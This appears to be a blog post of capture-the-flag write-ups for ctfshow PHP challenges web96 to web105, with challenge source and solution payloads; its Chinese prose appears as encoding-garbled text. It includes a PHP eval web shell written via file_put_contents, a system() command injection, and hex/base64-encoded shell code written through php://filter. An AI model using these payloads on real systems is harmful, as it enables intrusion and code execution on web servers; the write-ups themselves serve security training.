<h3 id="web96"><a href="#web96" class="headerlink" title="web96"></a>web96</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;u&#x27;]))&#123;</span><br><span class="line">    if($_GET[&#x27;u&#x27;]==&#x27;flag.php&#x27;)&#123;</span><br><span class="line">        die(&quot;no no no&quot;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        highlight_file($_GET[&#x27;u&#x27;]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>è¿™é¢˜æ²¡ä»€ä¹ˆè¿‡æ»¤ç›´æ¥è¯»å½“å‰ç›®å½•ä¸‹çš„flag.phpå°±å¥½</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?u=./flag.php</span><br></pre></td></tr></table></figure>

<p>æˆ–è€…ç”¨ä¼ªåè®®è¯»å–ä¹Ÿè¡Œ</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?u=php://filter/resource=flag.php</span><br></pre></td></tr></table></figure>



<h3 id="web97"><a href="#web97" class="headerlink" title="web97"></a>web97</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">if (isset($_POST[&#x27;a&#x27;]) and isset($_POST[&#x27;b&#x27;])) &#123;</span><br><span class="line">if ($_POST[&#x27;a&#x27;] != $_POST[&#x27;b&#x27;])</span><br><span class="line">if (md5($_POST[&#x27;a&#x27;]) === md5($_POST[&#x27;b&#x27;]))</span><br><span class="line">echo $flag;</span><br><span class="line">else</span><br><span class="line">print &#x27;Wrong.&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>

<p>é¢˜ç›®éœ€è¦æˆ‘ä»¬ç”¨postæ–¹å¼ä¼ å…¥aå’Œbï¼Œå¹¶ä¸”a!&#x3D;bï¼ˆè¿™é‡Œæ˜¯å¼±æ¯”è¾ƒï¼‰</p>
<p>ä½†è¿™é‡Œ<code>md5($_POST[&#39;a&#39;]) === md5($_POST[&#39;b&#39;])</code>è¿™é‡Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ä¸€ä¸ªå­—ç¬¦ä¸²æ¯”è¾ƒçš„ä¸€ä¸ªç‰¹æ€§</p>
<blockquote>
<p>MD5è¿™ä¸ªå‡½æ•°å‘¢æœ‰ä¸ªæ¼æ´ï¼Œä¼ å…¥çš„å‚æ•°ä¸ºæ•°ç»„çš„æ—¶å€™ä¼šå‘ç”Ÿé”™è¯¯ï¼Œå¹¶è¿”å›NULL</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a[]=1&amp;b[]=2</span><br></pre></td></tr></table></figure>



<h3 id="web98"><a href="#web98" class="headerlink" title="web98"></a>web98</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">$_GET?$_GET=&amp;$_POST:&#x27;flag&#x27;;</span><br><span class="line">$_GET[&#x27;flag&#x27;]==&#x27;flag&#x27;?$_GET=&amp;$_COOKIE:&#x27;flag&#x27;;</span><br><span class="line">$_GET[&#x27;flag&#x27;]==&#x27;flag&#x27;?$_GET=&amp;$_SERVER:&#x27;flag&#x27;;</span><br><span class="line">highlight_file($_GET[&#x27;HTTP_FLAG&#x27;]==&#x27;flag&#x27;?$flag:__FILE__);</span><br><span class="line"></span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`$_GET?$_GET=&amp;$_POST:&#x27;flag&#x27;;` </span><br></pre></td></tr></table></figure>

<p>è¿™å¥è¯è§£é‡Šä¸€ä¸‹ï¼Œè¿™æ˜¯ä¸‰ç›®è¿ç®—ç¬¦</p>
<p>å½“å­˜åœ¨GETä¼ å‚æ—¶ï¼Œåˆ™æŠŠpostä¼ å‚åœ°å€ç»™getï¼Œå¦‚æœä¸å­˜åœ¨åˆ™ä¼ çš„å‚æ•°ä¸ºflag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_GET[&#x27;flag&#x27;]==&#x27;flag&#x27;?$_GET=&amp;$_COOKIE:&#x27;flag&#x27;;</span><br></pre></td></tr></table></figure>

<p>å¦‚æœä¼ çš„flag&#x3D;â€™flagâ€™,åˆ™æŠŠCOOKIEä¼ å‚åœ°å€ç»™get,å¦åˆ™è®©å…¶ç­‰äºâ€™flagâ€™</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_GET[&#x27;flag&#x27;]==&#x27;flag&#x27;?$_GET=&amp;$_SERVER:&#x27;flag&#x27;; </span><br></pre></td></tr></table></figure>

<p>å¦‚æœä¼ çš„flag&#x3D;â€™flagâ€™,åˆ™æŠŠSERVERä¼ å‚åœ°å€ç»™get,å¦åˆ™è®©å…¶ç­‰äºâ€™flagâ€™</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_GET[&#x27;HTTP_FLAG&#x27;]==&#x27;flag&#x27;?$flag:__FILE__</span><br></pre></td></tr></table></figure>

<p>å¦‚æœä¼ å…¥çš„HTTP_FLAG&#x3D;â€˜flagâ€™æ˜¾ç¤º$flagï¼Œå¦åˆ™æ˜¾ç¤ºå½“å‰é¡µé¢</p>
<p>å¦‚æœæˆ‘ä»¬ç›´æ¥ç”¨getæ–¹å¼ä¼ å…¥</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?HTTP_FLAG=flag</span><br></pre></td></tr></table></figure>

<p>ç”±äºå­˜åœ¨GETä¼ å‚ï¼Œä¼šæŠŠpostä¼ å‚åœ°å€ç»™get</p>
<p>æ‰€ä»¥è¿™é‡Œæˆ‘ä»¬éšä¾¿ç”¨getæ–¹å¼ä¼ å…¥ä¸€ä¸ªï¼Œç„¶åç”¨postè¦†ç›–æ‰</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?num=1111</span><br><span class="line"></span><br><span class="line">post:HTTP_FLAG=flag</span><br></pre></td></tr></table></figure>

<p>å³å¯highlight_file($flag)ï¼Œå› ä¸º$flagä¸æ˜¯phpæ–‡ä»¶ï¼Œæ‰€ä»¥ä¼šå¯¼è‡´æŠ¥é”™è€Œå›æ˜¾$flagçš„å€¼</p>
<h3 id="web99"><a href="#web99" class="headerlink" title="web99"></a>web99</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(__FILE__);</span><br><span class="line">$allow = array();</span><br><span class="line">for ($i=36; $i &lt; 0x36d; $i++) &#123; </span><br><span class="line">    array_push($allow, rand(1,$i));</span><br><span class="line">&#125;</span><br><span class="line">if(isset($_GET[&#x27;n&#x27;]) &amp;&amp; in_array($_GET[&#x27;n&#x27;], $allow))&#123;</span><br><span class="line">    file_put_contents($_GET[&#x27;n&#x27;], $_POST[&#x27;content&#x27;]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>

<p><code>array_push</code></p>
<blockquote>
<p>array_push â€” å°†ä¸€ä¸ªæˆ–å¤šä¸ªå•å…ƒå‹å…¥æ•°ç»„çš„æœ«å°¾ï¼ˆå…¥æ ˆï¼‰</p>
</blockquote>
<p><code>in_array</code></p>
<blockquote>
<p>æ£€æŸ¥æ•°ç»„ä¸­æ˜¯å¦å­˜åœ¨æŸä¸ªå€¼ï¼Œå¦‚æœæ²¡æœ‰è®¾ç½®ç¬¬ä¸‰ä¸ªå‚æ•°ï¼Œåˆ™ä½¿ç”¨å®½æ¾çš„æ¯”è¾ƒï¼Œå…ˆå°†å­—ç¬¦ä¸²è½¬åŒ–ä¸ºiæ•°å­—ï¼Œå†æ¯”è¾ƒ</p>
</blockquote>
<p>åˆ†æä¸€ä¸‹é¢˜ç›®é¦–å…ˆå°†è®¸å¤šéšæœºæ•°æ”¾å…¥æ•°ç»„ä¸­ï¼Œç„¶åå½“ä¼ å…¥çš„nåœ¨æ•°ç»„ä¸­ï¼Œå°†contentå†™å…¥ä¼ å…¥çš„nä¸­</p>
<p>ç”±äºè¿™é‡Œå¾ªç¯äº†å¾ˆå¤šæ¬¡ï¼Œå‡ºç°1çš„æ¦‚ç‡æ¯”è¾ƒå¤§ï¼ˆå¤šè¯•å‡ æ¬¡æ€»èƒ½æˆåŠŸï¼‰</p>
<p>ç„¶åæ˜¯ 1.phpåœ¨è¿›è¡Œåˆ¤æ–­æ—¶ <code>1.php == 1</code></p>
<p>å¹¶å°†ä¸€å¥è¯æœ¨é©¬å†™å…¥content</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?n=1.php</span><br><span class="line"></span><br><span class="line">POST:content=&lt;?php @eval($_POST[1]);?&gt;</span><br></pre></td></tr></table></figure>

<p>èšå‰‘è¿æ¥å³å¯</p>
<h3 id="web100"><a href="#web100" class="headerlink" title="web100"></a>web100</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(__FILE__);</span><br><span class="line">include(&quot;ctfshow.php&quot;);</span><br><span class="line">//flag in class ctfshow;</span><br><span class="line">$ctfshow = new ctfshow();</span><br><span class="line">$v1=$_GET[&#x27;v1&#x27;];</span><br><span class="line">$v2=$_GET[&#x27;v2&#x27;];</span><br><span class="line">$v3=$_GET[&#x27;v3&#x27;];</span><br><span class="line">$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);</span><br><span class="line">if($v0)&#123;</span><br><span class="line">    if(!preg_match(&quot;/\;/&quot;, $v2))&#123;</span><br><span class="line">        if(preg_match(&quot;/\;/&quot;, $v3))&#123;</span><br><span class="line">            eval(&quot;$v2(&#x27;ctfshow&#x27;)$v3&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p><code>is_numeric</code></p>
<blockquote>
<p>â€” æ£€æµ‹å˜é‡æ˜¯å¦ä¸ºæ•°å­—æˆ–æ•°å­—å­—ç¬¦ä¸²</p>
</blockquote>
<p>è¿™ä¸ªé¢˜ç¬¬ä¸€æ¬¡åšçš„æ—¶å€™æ—¶éå¸¸æ‡µé€¼çš„</p>
<p>è¿™é¢˜çš„è§£é¢˜ç‚¹åœ¨</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œå°±è¦è®²ä¸€ä¸‹è¿ç®—ç¬¦çš„ä¼˜å…ˆçº§é—®é¢˜äº†</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;&amp; --&gt; || --&gt; = --&gt; and --&gt; or</span><br></pre></td></tr></table></figure>

<p>æ‰€ä»¥é¢˜ç›®è¿™é‡Œèµ‹å€¼çš„ä¼˜å…ˆçº§å¤§äºandï¼Œå³</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$v0=is_numeric($v1)</span><br></pre></td></tr></table></figure>

<p>æ‰€ä»¥è¿™é‡Œæˆ‘ä»¬åªéœ€è¦è®©v1ä¸ºæ•°å­—ï¼Œåé¢ä¸¤ä¸ªå‚æ•°å¯æ§ï¼Œv2,v3è¿‡æ»¤äº†åˆ†å·ï¼Œ</p>
<p>ç°åœ¨å°±è¦è§£å†³</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval(&quot;$v2(&#x27;ctfshow&#x27;)$v3&quot;);</span><br></pre></td></tr></table></figure>

<p>çªç„¶å‘ç°é¢˜ç›®æ³¨é‡Šé‡Œæœ‰  <code>flag in class ctfshow; </code></p>
<p>æˆ‘è¿™é‡Œç›´æ¥ç”¨ç®¡é“ç¬¦äº†<code>||</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?v1=1&amp;v2=system(&quot;cat ctfshow.php&quot;)||&amp;v3=;</span><br></pre></td></tr></table></figure>



<h3 id="web101"><a href="#web101" class="headerlink" title="web101"></a>web101</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(__FILE__);</span><br><span class="line">include(&quot;ctfshow.php&quot;);</span><br><span class="line">//flag in class ctfshow;</span><br><span class="line">$ctfshow = new ctfshow();</span><br><span class="line">$v1=$_GET[&#x27;v1&#x27;];</span><br><span class="line">$v2=$_GET[&#x27;v2&#x27;];</span><br><span class="line">$v3=$_GET[&#x27;v3&#x27;];</span><br><span class="line">$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);</span><br><span class="line">if($v0)&#123;</span><br><span class="line">    if(!preg_match(&quot;/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\)|\-|\_|\+|\=|\&#123;|\[|\&quot;|\&#x27;|\,|\.|\;|\?|[0-9]/&quot;, $v2))&#123;</span><br><span class="line">        if(!preg_match(&quot;/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\(|\-|\_|\+|\=|\&#123;|\[|\&quot;|\&#x27;|\,|\.|\?|[0-9]/&quot;, $v3))&#123;</span><br><span class="line">            eval(&quot;$v2(&#x27;ctfshow&#x27;)$v3&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªé¢˜ç›¸æ¯”ä¸Šä¸ªï¼Œå¢åŠ äº†è®¸å¤šè¿‡æ»¤</p>
<p>ä¸»è¦è¿˜æ˜¯æ„é€ </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval(&quot;$v2(&#x27;ctfshow&#x27;)$v3&quot;); </span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œä¹Ÿæ˜¯çœ‹äº†å¾ˆå¤šå¸ˆå‚…çš„wpæ‰ç†è§£ï¼Œéœ€è¦è®²ä¸€ä¸‹</p>
<p><code>ReflectionClasss</code></p>
<blockquote>
<p>åå°„ç±»ReflectionClassæ‰§è¡Œå‘½ä»¤</p>
<p>ReflectionClassåå°„ç±»åœ¨PHP5æ–°åŠ å…¥ï¼Œç»§æ‰¿è‡ªReflectorï¼Œå®ƒå¯ä»¥ä¸å·²å®šä¹‰çš„ç±»å»ºç«‹æ˜ å°„å…³ç³»ï¼Œé€šè¿‡åå°„ç±»å¯ä»¥å¯¹ç±»æ“ä½œ<br>åå°„ç±»ä¸ä»…ä»…å¯ä»¥å»ºç«‹å¯¹ç±»çš„æ˜ å°„ï¼Œä¹Ÿå¯ä»¥å»ºç«‹å¯¹PHPåŸºæœ¬æ–¹æ³•çš„æ˜ å°„ï¼Œå¹¶ä¸”è¿”å›åŸºæœ¬æ–¹æ³•æ‰§è¡Œçš„æƒ…å†µã€‚å› æ­¤å¯ä»¥é€šè¿‡å»ºç«‹åå°„ç±»new ReflectionClass(system(â€˜cmdâ€™))æ¥æ‰§è¡Œå‘½ä»¤</p>
</blockquote>
<p><strong>payload</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?v1=1&amp;v2=echo new ReflectionClass&amp;v3=;</span><br></pre></td></tr></table></figure>

<p>æœ€åå°† 0x2dæ”¹ä¸º -  ï¼Œå‘ç°åªæœ‰35ä½ï¼Œæ²¡æƒ³åˆ°æœ€åä¸€ä½è¦çˆ†ç ´ã€‚ã€‚ã€‚çœ‹è¿æ°”å’¯</p>
<h3 id="web102"><a href="#web102" class="headerlink" title="web102"></a>web102</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(__FILE__);</span><br><span class="line">$v1 = $_POST[&#x27;v1&#x27;];</span><br><span class="line">$v2 = $_GET[&#x27;v2&#x27;];</span><br><span class="line">$v3 = $_GET[&#x27;v3&#x27;];</span><br><span class="line">$v4 = is_numeric($v2) and is_numeric($v3);</span><br><span class="line">if($v4)&#123;</span><br><span class="line">    $s = substr($v2,2);</span><br><span class="line">    $str = call_user_func($v1,$s);</span><br><span class="line">    echo $str;</span><br><span class="line">    file_put_contents($v3,$str);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    die(&#x27;hacker&#x27;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><code>substr</code></p>
<blockquote>
<p><strong>substr</strong> ( string <code>$string</code> , int <code>$start</code> [, int <code>$length</code> ] ) : string</p>
<p>è¿”å›å­—ç¬¦ä¸² <code>string</code> ç”± <code>start</code> å’Œ <code>length</code> å‚æ•°æŒ‡å®šçš„å­å­—ç¬¦ä¸²ã€‚</p>
</blockquote>
<p>è¿™é‡Œ <code>$s = substr($v2,2);</code>æˆªå–äº†v2çš„[2:],ä»ç¬¬ä¸‰ä¸ªå­—ç¬¦åˆ°æœ«å°¾</p>
<p><code>call_user_func</code></p>
<blockquote>
<p><strong>call_user_func</strong> ( <a href="php/language.types.callable.html">callable</a> <code>$callback</code> [, <a href="php/language.pseudo-types.html#language.types.mixed">mixed</a> <code>$parameter</code> [, <a href="php/language.pseudo-types.html#language.types.mixed">mixed</a> <code>$...</code> ]] ) : <a href="php/language.pseudo-types.html#language.types.mixed">mixed</a></p>
<p>ç¬¬ä¸€ä¸ªå‚æ•° <code>callback</code> æ˜¯è¢«è°ƒç”¨çš„å›è°ƒå‡½æ•°ï¼Œå…¶ä½™å‚æ•°æ˜¯å›è°ƒå‡½æ•°çš„å‚æ•°ã€‚</p>
</blockquote>
<p>è¿™é‡Œv1ï¼Œv3å¯æ§ï¼Œv2è¦ä¿è¯èƒ½å†™shellï¼Œåˆè¦ä¿è¯èƒ½ä¸ºæ•°å­—ã€‚</p>
<p>è¿™é‡Œç™¾æ€ä¸å¾—å…¶è§£ï¼Œçœ‹äº†å¸ˆå‚…çš„wpåï¼ŒçœŸçš„è¦æ„Ÿå¹ä¸€ä¸‹ï¼Œå¸ˆå‚…ä»¬çš„åˆ›é€ åŠ›å•Šï¼</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?=`tac *`;  </span><br></pre></td></tr></table></figure>

<p>è¿™æ˜¯æˆ‘ä»¬è¦æ‰§è¡Œçš„å‘½ä»¤ï¼Œè¿›è¡Œhexç¼–ç åä¸ºï¼š3c3f3d60746163202a603b ï¼Œå‘ç°å…¶ä¸­æœ‰å­—æ¯<br>äºæ˜¯åœ¨æ­¤ä¹‹å‰è¿›è¡Œbase64ç¼–ç ä¸€æ¬¡</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PD89YHRhYyAqYDs= //åœ¨è¿›è¡Œhexç¼–ç </span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">5044383959485268597941715944733d</span><br></pre></td></tr></table></figure>

<p>è¿™æ—¶æˆ‘ä»¬å‘ç° <code>3d</code>ä¸ºç­‰å·</p>
<p>å³v1&#x3D;hex2bin  v2&#x3D;00504438395948526859794171594473  v3&#x3D;php:&#x2F;&#x2F;1.php</p>
<p><strong>payload</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST:v1=hex2bin</span><br><span class="line"></span><br><span class="line">?v2=00504438395948526859794171594473&amp;v3=php://filter/write=convert.base64-decode/resource=1.php</span><br></pre></td></tr></table></figure>

<p>å¤ªå¦™äº†ï¼ï¼</p>
<h3 id="web103"><a href="#web103" class="headerlink" title="web103"></a>web103</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(__FILE__);</span><br><span class="line">$v1 = $_POST[&#x27;v1&#x27;];</span><br><span class="line">$v2 = $_GET[&#x27;v2&#x27;];</span><br><span class="line">$v3 = $_GET[&#x27;v3&#x27;];</span><br><span class="line">$v4 = is_numeric($v2) and is_numeric($v3);</span><br><span class="line">if($v4)&#123;</span><br><span class="line">    $s = substr($v2,2);</span><br><span class="line">    $str = call_user_func($v1,$s);</span><br><span class="line">    echo $str;</span><br><span class="line">    if(!preg_match(&quot;/.*p.*h.*p.*/i&quot;,$str))&#123;</span><br><span class="line">        file_put_contents($v3,$str);</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        die(&#x27;Sorry&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    die(&#x27;hacker&#x27;);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>è¿‡æ»¤çš„æ›´åŠ å¤šäº†ï¼Œç”¨ä¸Šä¸€é¢˜çš„æ€è·¯ä¹Ÿèƒ½è§£å‡ºæ¥ï¼Œæˆ‘æ¢ä¸€ä¸ªå§</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?=`cat *`;</span><br></pre></td></tr></table></figure>

<p>è½¬åŒ–ä¸ºbase64</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PD89YGNhdCAqYDs</span><br></pre></td></tr></table></figure>

<p>å†è½¬åŒ–ä¸ºasciiçš„åå…­è¿›åˆ¶</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">5044383959474e6864434171594473</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬å‘ç°è¿™ä¸ªå¾ˆå·§å¦™çš„é‡Œé¢åªæœ‰ä¸€ä¸ªå­—æ¯eï¼Œä½†è¿™é‡Œå¯ä»¥å°†å…¶å½“æˆç§‘å­¦è®¡æ•°æ³•ï¼Œ</p>
<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?v2=005044383959474e6864434171594473&amp;v3=php://filter/write=convert.base64-decode/resource=1.php</span><br></pre></td></tr></table></figure>



<h3 id="web104"><a href="#web104" class="headerlink" title="web104"></a>web104</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(__FILE__);</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123;</span><br><span class="line">    $v1 = $_POST[&#x27;v1&#x27;];</span><br><span class="line">    $v2 = $_GET[&#x27;v2&#x27;];</span><br><span class="line">    if(sha1($v1)==sha1($v2))&#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>æ•°ç»„ç»•è¿‡ï¼Œsha(a[])ä¼šè¿”å›null  è€Œnull&#x3D;&#x3D;null</p>
<h3 id="web105"><a href="#web105" class="headerlink" title="web105"></a>web105</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(__FILE__);</span><br><span class="line">include(&#x27;flag.php&#x27;);</span><br><span class="line">error_reporting(0);</span><br><span class="line">$error=&#x27;ä½ è¿˜æƒ³è¦flagå˜›ï¼Ÿ&#x27;;</span><br><span class="line">$suces=&#x27;æ—¢ç„¶ä½ æƒ³è¦é‚£ç»™ä½ å§ï¼&#x27;;</span><br><span class="line">foreach($_GET as $key =&gt; $value)&#123;</span><br><span class="line">    if($key===&#x27;error&#x27;)&#123;</span><br><span class="line">        die(&quot;what are you doing?!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    $$key=$$value;</span><br><span class="line">&#125;foreach($_POST as $key =&gt; $value)&#123;</span><br><span class="line">    if($value===&#x27;flag&#x27;)&#123;</span><br><span class="line">        die(&quot;what are you doing?!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    $$key=$$value;</span><br><span class="line">&#125;</span><br><span class="line">if(!($_POST[&#x27;flag&#x27;]==$flag))&#123;</span><br><span class="line">    die($error);</span><br><span class="line">&#125;</span><br><span class="line">echo &quot;your are good&quot;.$flag.&quot;\n&quot;;</span><br><span class="line">die($suces); </span><br></pre></td></tr></table></figure>

<p>è¿™é¢˜å…¶å®ç¬¬ä¸€åšçš„æ—¶å€™æŒºæ‡µé€¼çš„ï¼Œåæ¥ä»”ç»†ç†æ¸…äº†ä¸€ä¸‹æ€è·¯ï¼Œå…¶å®å°±æ˜¯ç®€å•çš„å˜é‡è¦†ç›–</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">foreach($_GET as $key =&gt; $value)&#123;</span><br><span class="line">    if($key===&#x27;error&#x27;)&#123;</span><br><span class="line">        die(&quot;what are you doing?!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    $$key=$$value; </span><br></pre></td></tr></table></figure>

